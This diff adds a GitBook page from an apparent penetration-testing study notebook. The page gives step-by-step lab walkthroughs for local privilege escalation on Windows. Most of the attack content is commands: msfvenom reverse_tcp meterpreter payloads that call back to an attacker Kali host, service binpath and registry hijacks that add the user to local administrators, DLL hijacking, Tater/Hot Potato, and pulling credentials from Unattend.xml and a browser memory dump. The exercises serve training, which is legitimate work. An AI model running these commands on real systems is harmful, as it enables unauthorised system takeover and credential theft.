@@ -1,0 +1,1258 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Local Privilege Escalation · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="user_hunt.html" />
+    
+    
+    <link rel="prev" href="2.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Index
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Getting comfortable with linux</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../linux/2_4.html">
+            
+                <a href="../linux/2_4.html">
+            
+                    
+                    finding your way around
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../linux/2_5.html">
+            
+                <a href="../linux/2_5.html">
+            
+                    
+                    managing linux services
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../linux/2_6.html">
+            
+                <a href="../linux/2_6.html">
+            
+                    
+                    searching, installing, and removing tools
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../linux/permission_table.html">
+            
+                <a href="../linux/permission_table.html">
+            
+                    
+                    Permission table
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Command line fun / Text -fu</li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" data-path="../linux/3_1.html">
+            
+                <a href="../linux/3_1.html">
+            
+                    
+                    The Bash Environment
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" data-path="../linux/3_2.html">
+            
+                <a href="../linux/3_2.html">
+            
+                    
+                    piping and redirection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.3" data-path="../linux/3_3.html">
+            
+                <a href="../linux/3_3.html">
+            
+                    
+                    Text searching and manipulation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.4" data-path="../linux/3_4.html">
+            
+                <a href="../linux/3_4.html">
+            
+                    
+                    Editing files from cmd line
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.5" data-path="../linux/3_5.html">
+            
+                <a href="../linux/3_5.html">
+            
+                    
+                    Comparing files
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.6" data-path="../linux/3_6.html">
+            
+                <a href="../linux/3_6.html">
+            
+                    
+                    Managing process
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.7" data-path="../linux/3_7.html">
+            
+                <a href="../linux/3_7.html">
+            
+                    
+                    File and cmd Monitoring
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.8" data-path="../linux/3_8.html">
+            
+                <a href="../linux/3_8.html">
+            
+                    
+                    curl
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.9" data-path="../linux/3_9.html">
+            
+                <a href="../linux/3_9.html">
+            
+                    
+                    Customizing Bash environment
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Practical tools</li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" data-path="../tools/4_1.html">
+            
+                <a href="../tools/4_1.html">
+            
+                    
+                    netcat
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" data-path="../tools/4_3.html">
+            
+                <a href="../tools/4_3.html">
+            
+                    
+                    powershell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.3" data-path="../tools/wireshark.html">
+            
+                <a href="../tools/wireshark.html">
+            
+                    
+                    Wireshark
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.4" data-path="../tools/tcpdump.html">
+            
+                <a href="../tools/tcpdump.html">
+            
+                    
+                    tcpdump
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Bash Scripting</li>
+        
+        
+    
+        <li class="chapter " data-level="5.1" data-path="../scripts/5_1.html">
+            
+                <a href="../scripts/5_1.html">
+            
+                    
+                    intro to bash scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2" data-path="../scripts/5_2.html">
+            
+                <a href="../scripts/5_2.html">
+            
+                    
+                    Variables
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.3" data-path="../scripts/5_3.html">
+            
+                <a href="../scripts/5_3.html">
+            
+                    
+                    if,else,elif statement
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.4" data-path="../scripts/5_4.html">
+            
+                <a href="../scripts/5_4.html">
+            
+                    
+                    Boolean Logical Operations
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.5" data-path="../scripts/5_5.html">
+            
+                <a href="../scripts/5_5.html">
+            
+                    
+                    Loops
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.6" data-path="../scripts/5_6.html">
+            
+                <a href="../scripts/5_6.html">
+            
+                    
+                    Functions
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Information Gathering</li>
+        
+        
+    
+        <li class="chapter " data-level="6.1" data-path="../osint/6_2.html">
+            
+                <a href="../osint/6_2.html">
+            
+                    
+                    Website Recon
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.2" data-path="../osint/6_4.html">
+            
+                <a href="../osint/6_4.html">
+            
+                    
+                    Google Hakcing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.3" data-path="../osint/6_6.html">
+            
+                <a href="../osint/6_6.html">
+            
+                    
+                    Recon-ng
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.4" data-path="../osint/6_7.html">
+            
+                <a href="../osint/6_7.html">
+            
+                    
+                    open-source code
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.5" data-path="../osint/6_8.html">
+            
+                <a href="../osint/6_8.html">
+            
+                    
+                    shodan
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.6" data-path="../osint/dns.html">
+            
+                <a href="../osint/dns.html">
+            
+                    
+                    Dns enumeration
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">File Transfers</li>
+        
+        
+    
+        <li class="chapter " data-level="7.1" data-path="../file_transfer/16_1.html">
+            
+                <a href="../file_transfer/16_1.html">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="7.2" data-path="../file_transfer/16_2.html">
+            
+                <a href="../file_transfer/16_2.html">
+            
+                    
+                    linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="7.3" data-path="../file_transfer/upgrade_shell.html">
+            
+                <a href="../file_transfer/upgrade_shell.html">
+            
+                    
+                    upgrading Non-interactive shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Antivirus Evasion</li>
+        
+        
+    
+        <li class="chapter " data-level="8.1" data-path="../antivirus/17_1.html">
+            
+                <a href="../antivirus/17_1.html">
+            
+                    
+                    what is antivirus
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.2" data-path="../antivirus/17_2.html">
+            
+                <a href="../antivirus/17_2.html">
+            
+                    
+                    Method of detecting malicious code
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3" data-path="../antivirus/17_3.html">
+            
+                <a href="../antivirus/17_3.html">
+            
+                    
+                    Bypassing AV Detection
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Web Attacks</li>
+        
+        
+    
+        <li class="chapter " data-level="9.1" data-path="../web/sql.html">
+            
+                <a href="../web/sql.html">
+            
+                    
+                    sql injection
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="9.1.1" data-path="../web/sqli_to_shell.html">
+            
+                <a href="../web/sqli_to_shell.html">
+            
+                    
+                    upload shell using sql injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Active Directory Attacks</li>
+        
+        
+    
+        <li class="chapter " data-level="10.1" data-path="1.html">
+            
+                <a href="1.html">
+            
+                    
+                    introduction to AD
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="10.2" data-path="../tools/4_3.html">
+            
+                <a href="../tools/4_3.html">
+            
+                    
+                    powershell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="10.3" data-path="2.html">
+            
+                <a href="2.html">
+            
+                    
+                    Domain Enumeration
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="10.4" data-path="priv_esca.html">
+            
+                <a href="priv_esca.html">
+            
+                    
+                    Local Privilege Escalation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="10.5" data-path="user_hunt.html">
+            
+                <a href="user_hunt.html">
+            
+                    
+                    User Hunting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="10.6" data-path="bloodhound.html">
+            
+                <a href="bloodhound.html">
+            
+                    
+                    Bloodhound
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="10.7" data-path="lateral.html">
+            
+                <a href="lateral.html">
+            
+                    
+                    Lateral Movement
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Binary Exploitation</li>
+        
+        
+    
+        <li class="chapter " data-level="11.1" data-path="../bin_exp/intro/intro.html">
+            
+                <a href="../bin_exp/intro/intro.html">
+            
+                    
+                    1. introduction
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="11.1.1" data-path="../bin_exp/intro/assembly.html">
+            
+                <a href="../bin_exp/intro/assembly.html">
+            
+                    
+                    1.1 Assembly
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="11.1.2" data-path="../bin_exp/intro/radare2.html">
+            
+                <a href="../bin_exp/intro/radare2.html">
+            
+                    
+                    1.2 Radare2
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Sec 660</li>
+        
+        
+    
+        <li class="chapter " data-level="12.1" data-path="../sec660/">
+            
+                <a href="../sec660/">
+            
+                    
+                    READme
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Networking</li>
+        
+        
+    
+
+    
+        
+        <li class="header">Crypto</li>
+        
+        
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >Local Privilege Escalation</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h2 id="local-privilege-escalation">LOCAL PRIVILEGE ESCALATION</h2>
+<p><strong>There are various ways of locally escalating privileges on Windows box</strong> :</p>
+<ul>
+<li>Missing  pathches</li>
+<li>Automated deployment and AutoLogon password in clear text.</li>
+<li>AlwaysInstalledElevated ( any user can run MSI as SYSTEM)</li>
+<li>Misconfiguratin Services</li>
+<li>DLLHijacking and more.</li>
+</ul>
+<p><strong>Various tools for Complete Coverage</strong></p>
+<ul>
+<li>powerup</li>
+<li>Beroot</li>
+<li>Privesc</li>
+</ul>
+<h3 id="basic-privilege-escalation">Basic Privilege escalation</h3>
+<pre><code class="lang-powershell"><span class="hljs-number">1</span>. Service Enumeration
+Get-ServiceUnquoted                 <span class="hljs-comment">#   returns services with unquoted paths that also have a space in the name</span>
+Get-ModifiableServiceFile           <span class="hljs-comment">#   returns services where the current user can write to the service binary path or its config</span>
+Get-ModifiableService               <span class="hljs-comment">#   returns services the current user can modify</span>
+Get-ServiceDetail                   <span class="hljs-comment">#   returns detailed information about a specified service</span>
+
+<span class="hljs-number">2</span>. Service Abuse
+Invoke-ServiceAbuse                 <span class="hljs-comment">#   modifies a vulnerable service to create a local admin or execute a custom command</span>
+Write-ServiceBinary                 <span class="hljs-comment">#   writes out a patched C # service binary that adds a local admin or executes a custom command</span>
+Install-ServiceBinary               <span class="hljs-comment">#   replaces a service binary with one that adds a local admin or executes a custom command</span>
+Restore-ServiceBinary               <span class="hljs-comment">#   restores a replaced service binary with the original executable</span>
+
+<span class="hljs-number">3</span>. DLL Hijacking
+Find-ProcessDLLHijack               <span class="hljs-comment">#   finds potential DLL hijacking opportunities for currently running processes</span>
+Find-PathDLLHijack                  <span class="hljs-comment">#   finds service %PATH% DLL hijacking opportunities</span>
+Write-HijackDll                     <span class="hljs-comment">#   writes out a hijackable DLL</span>
+
+<span class="hljs-number">4</span>. Registry Checks
+Get-RegistryAlwaysInstallElevated   <span class="hljs-comment">#  checks if the AlwaysInstallElevated registry key is set</span>
+Get-RegistryAutoLogon               <span class="hljs-comment">#   checks for Autologon credentials in the registry</span>
+Get-ModifiableRegistryAutoRun       <span class="hljs-comment">#   checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns</span>
+
+<span class="hljs-number">5</span>. Miscellaneous Checks
+Get-ModifiableScheduledTaskFile     <span class="hljs-comment">#   find schtasks with modifiable target files</span>
+Get-UnattendedInstallFile           <span class="hljs-comment">#   finds remaining unattended installation files</span>
+Get-Webconfig                       <span class="hljs-comment">#   checks for any encrypted web.config strings</span>
+Get-ApplicationHost                 <span class="hljs-comment">#   checks for encrypted application pool and virtual directory passwords</span>
+Get-SiteListPassword                <span class="hljs-comment">#   retrieves the plaintext passwords for any found McAfee`&apos;s SiteList.xml files</span>
+Get-CachedGPPPassword               <span class="hljs-comment">#   checks for passwords in cached Group Policy Preferences files</span>
+
+<span class="hljs-number">6</span>. Other Helpers/Meta-Functions
+Get-ModifiablePath                  <span class="hljs-comment">#   tokenizes an input string and returns the files in it the current user can modify</span>
+Get-CurrentUserTokenGroupSid        <span class="hljs-comment">#   returns all SIDs that the current user is a part of, whether they are disabled or not</span>
+Add-ServiceDacl                     <span class="hljs-comment">#   adds a Dacl field to a service object returned by Get-Service</span>
+Set-ServiceBinPath                  <span class="hljs-comment">#   sets the binary path for a service to a specified value through Win32 API methods</span>
+Test-ServiceDaclPermission          <span class="hljs-comment">#   tests one or more passed services or service names against a given permission set</span>
+Write-UserAddMSI                    <span class="hljs-comment">#   write out a MSI installer that prompts for a user to be added</span>
+
+<span class="hljs-number">7</span>. Check ALL
+Invoke-AllChecks                    <span class="hljs-comment">#   runs all current escalation checks and returns a report</span>
+</code></pre>
+<hr>
+<h2 id="autorun">Autorun</h2>
+<h3 id="detection">Detection</h3>
+<p>Windows VM</p>
+<ol>
+<li>Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe</li>
+<li>In Autoruns, click on the &#x2018;Logon&#x2019; tab.</li>
+<li>From the listed results, notice that the &#x201C;My Program&#x201D; entry is pointing to &#x201C;C:\Program Files\Autorun Program\program.exe&#x201D;.</li>
+<li>In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu &quot;C:\Program Files\Autorun Program&quot;</li>
+<li>From the output, notice that the &#x201C;Everyone&#x201D; user group has &#x201C;FILE_ALL_ACCESS&#x201D; permission on the &#x201C;program.exe&#x201D; file.<h3 id="exploitation">Exploitation</h3>
+Kali VM</li>
+<li>Open command prompt and type: msfconsole</li>
+<li>In Metasploit (msf &gt; prompt) type: use multi/handler</li>
+<li>In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp</li>
+<li>In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]</li>
+<li>In Metasploit (msf &gt; prompt) type: run</li>
+<li>Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe</li>
+<li>Copy the generated file, program.exe, to the Windows VM.</li>
+</ol>
+<p>Windows VM</p>
+<ol>
+<li>Place program.exe in &#x2018;C:\Program Files\Autorun Program&#x2019;.</li>
+<li>To simulate the privilege escalation effect, logoff and then log back on as an administrator user.</li>
+</ol>
+<p>Kali VM</p>
+<ol>
+<li>Wait for a new session to open in Metasploit.</li>
+<li>In Metasploit (msf &gt; prompt) type: sessions -i [Session ID]</li>
+<li>To confirm that the attack succeeded, in Metasploit (msf &gt; prompt) type: getuid</li>
+</ol>
+<hr>
+<h2 id="alwaysinstallelevated">AlwaysInstallElevated</h2>
+<h3 id="detection">Detection</h3>
+<p>Windows VM</p>
+<ol>
+<li>Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer</li>
+<li>From the output, notice that &#x201C;AlwaysInstallElevated&#x201D; value is 1</li>
+<li>In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer</li>
+<li>From the output, notice that &#x201C;AlwaysInstallElevated&#x201D; value is 1<h3 id="exploitation">exploitation</h3>
+Kali VM</li>
+<li>Open command prompt and type: msfconsole</li>
+<li>In Metasploit (msf &gt; prompt) type: use multi/handler</li>
+<li>In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp</li>
+<li>In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]</li>
+<li>In Metasploit (msf &gt; prompt) type: run</li>
+<li>Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi</li>
+<li>Copy the generated file, setup.msi, to the Windows VM.</li>
+</ol>
+<p>Windows VM</p>
+<ol>
+<li>Place &#x2018;setup.msi&#x2019; in &#x2018;C:\Temp&#x2019;.</li>
+<li>Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi</li>
+<li>It  is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</li>
+</ol>
+<hr>
+<h2 id="registry">Registry</h2>
+<h3 id="detection">Detection</h3>
+<p>Windows VM</p>
+<ol>
+<li>Open powershell prompt and type: Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl</li>
+<li>Notice that the output suggests that user belong to &#x201C;NT  AUTHORITY\INTERACTIVE&#x201D; has &#x201C;FullContol&#x201D; permission over the registry  key.</li>
+</ol>
+<h3 id="exploitation">Exploitation</h3>
+<p>Windows VM</p>
+<ol>
+<li>Copy &#x2018;C:\Users\User\Desktop\Tools\Source\windows_service.c&#x2019; to the Kali VM.</li>
+</ol>
+<p>Kali VM</p>
+<ol>
+<li>Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add</li>
+<li>Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use &apos;sudo apt install gcc-mingw-w64&apos;) </li>
+<li>Copy the generated file x.exe, to the Windows VM.</li>
+</ol>
+<p>Windows VM</p>
+<ol>
+<li>Place x.exe in &#x2018;C:\Temp&#x2019;.</li>
+<li>Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f</li>
+<li>In the command prompt type: sc start regsvc</li>
+<li>It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</li>
+</ol>
+<hr>
+<h2 id="exec-path">Exec Path</h2>
+<h3 id="detection">Detection</h3>
+<p>Windows VM</p>
+<ol>
+<li>Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu &quot;C:\Program Files\File Permissions Service&quot;</li>
+<li>Notice that the &#x201C;Everyone&#x201D; user group has &#x201C;FILE_ALL_ACCESS&#x201D; permission on the filepermservice.exe file.</li>
+</ol>
+<h3 id="exploitation">Exploitation</h3>
+<p>Windows VM</p>
+<ol>
+<li>Open command prompt and type: copy /y c:\Temp\x.exe &quot;c:\Program Files\File Permissions Service\filepermservice.exe&quot;</li>
+<li>In command prompt type: sc start filepermsvc</li>
+<li>It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</li>
+</ol>
+<hr>
+<h2 id="startup-applications">Startup Applications</h2>
+<h3 id="detection">Detection</h3>
+<p>Windows VM</p>
+<ol>
+<li>Open command prompt and type: icacls.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</li>
+<li>From the output notice that the &#x201C;BUILTIN\Users&#x201D; group has full access &#x2018;(F)&#x2019; to the directory.<h3 id="exploitation">Exploitation</h3>
+Kali VM</li>
+<li>Open command prompt and type: msfconsole</li>
+<li>In Metasploit (msf &gt; prompt) type: use multi/handler</li>
+<li>In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp</li>
+<li>In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]</li>
+<li>In Metasploit (msf &gt; prompt) type: run</li>
+<li>Open another command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe</li>
+<li>Copy the generated file, x.exe, to the Windows VM.
+Windows VM</li>
+<li>Place x.exe in &#x201C;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&#x201D;.</li>
+<li>Logoff.</li>
+<li>Login with the administrator account credentials.
+Kali VM</li>
+<li>Wait for a session to be created, it may take a few seconds.</li>
+<li>In Meterpreter(meterpreter &gt; prompt) type: getuid</li>
+<li>From the output, notice the user is &#x201C;User-PC\Admin&#x201D;</li>
+</ol>
+<hr>
+<h2 id="dll-hijacking">DLL Hijacking</h2>
+<h3 id="detection">Detection</h3>
+<p>Windows VM</p>
+<ol>
+<li>Open the Tools folder that is located on the desktop and then go the Process Monitor folder.</li>
+<li>In reality, executables would be copied from the victim&#x2019;s host over to  the attacker&#x2019;s host for analysis during run time. Alternatively, the  same software can be installed on the attacker&#x2019;s host for analysis, in  case they can obtain it. To simulate this, right click on Procmon.exe  and select &#x2018;Run as administrator&#x2019; from the menu.</li>
+<li>In procmon, select &quot;filter&quot;.  From the left-most drop down menu, select &#x2018;Process Name&#x2019;.</li>
+<li>In the input box on the same line type: dllhijackservice.exe</li>
+<li>Make sure the line reads &#x201C;Process Name is dllhijackservice.exe then  Include&#x201D; and click on the &#x2018;Add&#x2019; button, then &#x2018;Apply&#x2019; and lastly on &#x2018;OK&#x2019;.</li>
+<li>Next, select from the left-most drop down menu &#x2018;Result&#x2019;.</li>
+<li>In the input box on the same line type: NAME NOT FOUND</li>
+<li>Make sure the line reads &#x201C;Result is NAME NOT FOUND then Include&#x201D; and click on the &#x2018;Add&#x2019; button, then &#x2018;Apply&#x2019; and lastly on &#x2018;OK&#x2019;.</li>
+<li>Open command prompt and type: sc start dllsvc</li>
+<li>Scroll to the bottom of the window. One of the highlighted results  shows that the service tried to execute &#x2018;C:\Temp\hijackme.dll&#x2019; yet it  could not do that as the file was not found. Note that &#x2018;C:\Temp&#x2019; is a  writable location.<h3 id="exploitation">Exploitation</h3>
+Windows VM</li>
+<li>Copy &#x2018;C:\Users\User\Desktop\Tools\Source\windows_dll.c&#x2019; to the Kali VM.</li>
+</ol>
+<p>Kali VM</p>
+<ol>
+<li>Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add</li>
+<li>Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll</li>
+<li>Copy the generated file hijackme.dll, to the Windows VM.
+Windows VM</li>
+<li>Place hijackme.dll in &#x2018;C:\Temp&#x2019;.</li>
+<li>Open command prompt and type: sc stop dllsvc &amp; sc start dllsvc</li>
+<li>It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</li>
+</ol>
+<hr>
+<h2 id="binpath">BinPath</h2>
+<h3 id="detection">Detection</h3>
+<p>Windows VM</p>
+<ol>
+<li>Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc</li>
+<li>Notice that the output suggests that the user &#x201C;User-PC\User&#x201D; has the &#x201C;SERVICE_CHANGE_CONFIG&#x201D; permission.<h3 id="exploitation">Exploitation</h3>
+Windows VM</li>
+<li>In command prompt type: sc config daclsvc binpath= &quot;net localgroup administrators user /add&quot;</li>
+<li>In command prompt type: sc start daclsvc</li>
+<li>It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</li>
+</ol>
+<hr>
+<h2 id="unquoted-service-paths">Unquoted Service Paths</h2>
+<h3 id="detection">Detection</h3>
+<p>Windows VM</p>
+<ol>
+<li>Open command prompt and type: sc qc unquotedsvc</li>
+<li>Notice that the &#x201C;BINARY_PATH_NAME&#x201D; field displays a path that is not confined between quotes.<h3 id="exploitation">Exploitation</h3>
+Kali VM</li>
+<li>Open command prompt and type: msfvenom -p windows/exec CMD=&apos;net localgroup administrators user /add&apos; -f exe-service -o common.exe</li>
+<li>Copy the generated file, common.exe, to the Windows VM.</li>
+</ol>
+<p>Windows VM</p>
+<ol>
+<li>Place common.exe in &#x2018;C:\Program Files\Unquoted Path Service&#x2019;.</li>
+<li>Open command prompt and type: sc start unquotedsvc</li>
+<li>It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators</li>
+</ol>
+<hr>
+<h2 id="hot-potato">Hot Potato</h2>
+<h3 id="exploitation">Exploitation</h3>
+<p>Windows VM</p>
+<ol>
+<li>In command prompt type: powershell.exe -nop -ep bypass</li>
+<li>In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1</li>
+<li>In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command &quot;net localgroup administrators user /add&quot;</li>
+<li>To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators</li>
+</ol>
+<hr>
+<h2 id="configuration-files">Configuration Files</h2>
+<h3 id="exploitation">Exploitation</h3>
+<p>Windows VM</p>
+<ol>
+<li>Open command prompt and type: notepad C:\Windows\Panther\Unattend.xml</li>
+<li>Scroll down to the &quot;Password&quot; property and copy the base64 string that is confined between the &quot;Value&quot; tags underneath it.</li>
+</ol>
+<p>Kali VM</p>
+<ol>
+<li>In a terminal, type: echo [copied base64] | base64 -d</li>
+<li>Notice the cleartext password</li>
+</ol>
+<hr>
+<h2 id="memory">Memory</h2>
+<h3 id="exploitation">Exploitation</h3>
+<p>Kali VM</p>
+<ol>
+<li>Open command prompt and type: msfconsole</li>
+<li>In Metasploit (msf &gt; prompt) type: use auxiliary/server/capture/http_basic</li>
+<li>In Metasploit (msf &gt; prompt) type: set uripath x</li>
+<li>In Metasploit (msf &gt; prompt) type: run</li>
+</ol>
+<p>Windows VM</p>
+<ol>
+<li>Open Internet Explorer and browse to: <a href="http://[Kali" target="_blank">http://[Kali</a> VM IP Address]/x</li>
+<li>Open command prompt and type: taskmgr</li>
+<li>In  Windows Task Manager, right-click on the &#x201C;iexplore.exe&#x201D; in the &quot;Image  Name&quot; columnand select &#x201C;Create Dump File&#x201D; from the popup menu.</li>
+<li>Copy the generated file, iexplore.DMP, to the Kali VM.</li>
+</ol>
+<p>Kali VM</p>
+<ol>
+<li>Place &apos;iexplore.DMP&apos; on the desktop.</li>
+<li>Open command prompt and type: strings /root/Desktop/iexplore.DMP | grep &quot;Authorization: Basic&quot;</li>
+<li>Select the Copy the Base64 encoded string.</li>
+<li>In command prompt type: echo -ne [Base64 String] | base64 -d</li>
+<li>Notice the credentials in the output.</li>
+</ol>
+<hr>
+<h2 id="stuff">Stuff</h2>
+<ul>
+<li>PowerUp Misconfiguration Abuse</li>
+<li>Powerless (bat version OSCP prepair)</li>
+<li>BeRoot General Priv Esc Enumeration Tool</li>
+<li>Privesc General Priv Esc Enumeration Tool</li>
+<li>FullPowers Restore A Service Account&apos;s Privileges</li>
